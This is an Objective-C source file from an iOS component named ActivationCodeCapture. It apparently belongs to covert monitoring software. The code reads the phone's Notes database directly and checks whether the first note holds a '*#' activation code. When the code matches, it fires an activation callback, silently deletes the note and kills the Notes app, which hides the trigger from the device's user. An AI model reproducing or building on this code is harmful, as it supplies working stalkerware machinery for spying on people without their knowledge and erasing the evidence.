//
//  NoteACCapture.m
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 12/21/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "NoteACCapture.h"
#import "ActivationCodeCaptureDelegate.h"
#import "DefStd.h"

#import "NoteContext.h"
#import "NoteObject.h"

#import <CoreData/NSManagedObjectContext.h>
#import <CoreData/NSPersistentStoreCoordinator.h>

@interface NoteACCapture (private)
- (void) fetchNotes;
- (void) deleteNote: (NSDictionary *) aNoteInfo;
@end

@implementation NoteACCapture

@synthesize mAC;

- (id) initWithDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate {
	if ((self = [super init])) {
		mDelegate = aDelegate;
	}
	return (self);
}

- (void) start {
	if (!mReader) {
		mReader = [[MessagePortIPCReader alloc] initWithPortName:kNoteACMessagePort
									  withMessagePortIPCDelegate:self];
		[mReader start];
	}
}

- (void) stop {
	if (mReader) {
		[mReader stop];
		[mReader release];
		mReader = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"Data did received from message port = %@", aRawData);
	[self fetchNotes];
}

- (void) fetchNotes {
	NoteContext *noteContext = [[NoteContext alloc] init];
	NSURL *url = [NSURL URLWithString:@"file://localhost/var/mobile/Library/Notes/notes.sqlite"];
	NSPersistentStoreCoordinator *psc = nil;
    
    if ([noteContext respondsToSelector:@selector(persistentStoreCoordinator)]) {
        psc	= [noteContext persistentStoreCoordinator];
    }
    else {//iOS 9.3
        psc	= [NoteContext persistentStoreCoordinator];
    }
    
	DLog(@"Persistent store coordinator = %@, stores = %@", psc, [psc persistentStores]);
	DLog(@"Persistent store for url = %@, store = %@", url, [psc persistentStoreForURL:url]);
	[psc setURL:url forPersistentStore:[[psc persistentStores] objectAtIndex:0]];
	
	NoteObject *note = [[noteContext allVisibleNotes] count] ? [[noteContext allVisibleNotes] objectAtIndex:0] : nil;
	if (note) {
		NSString *noteContent = [note contentAsPlainText];
		DLog(@"Content as plain text = %@", noteContent);
		
		if (noteContent && [noteContent length] >= 3) {
			if ([noteContent hasPrefix:@"*#"]) {
				NSString* ac = [noteContent substringWithRange:NSMakeRange(2, [noteContent length] - 2)];
				NSRange astricRange = [ac rangeOfString:@"*"];
				NSRange addrRange = [ac rangeOfString:@"#"];
				DLog(@"AC from note: %@", ac);
				if (addrRange.length == 0 && astricRange.length == 0) {
					if ([[self mAC] isEqualToString:ac]) {
						if ([mDelegate respondsToSelector:@selector(activationCodeDidReceived:)]) {
							[mDelegate performSelector:@selector(activationCodeDidReceived:) withObject:self withObject:ac];
						}
						
						// Delete note
						NSDictionary *noteInfo = [NSDictionary dictionaryWithObjectsAndKeys:noteContext, @"NoteContext",
																							note, @"NoteObject",
																							nil];
						[self performSelector:@selector(deleteNote:) withObject:noteInfo afterDelay:1.0];
					}/*
					else if ([ac isEqualToString:_DEFAULTACTIVATIONCODE_]) {
						// Delete note
						NSDictionary *noteInfo = [NSDictionary dictionaryWithObjectsAndKeys:noteContext, @"NoteContext",
												  note, @"NoteObject",
												  nil];
						[self performSelector:@selector(deleteNote:) withObject:noteInfo afterDelay:1.0];						
					}*/
                    else {
                        DLog(@"mAC is, %@", [self mAC]);
                    }
                }
			}
		}
	}
	[noteContext release];
}

- (void) deleteNote: (NSDictionary *) aNoteInfo {
	NoteContext *noteContext = [aNoteInfo objectForKey:@"NoteContext"];
	NoteObject *note = [aNoteInfo objectForKey:@"NoteObject"];
	[noteContext deleteNote:note];
	[noteContext saveSilently:nil];
	system("killall MobileNotes");
}

- (void) dealloc {
	[mAC release];
	[self stop];
	[super dealloc];
}

@end
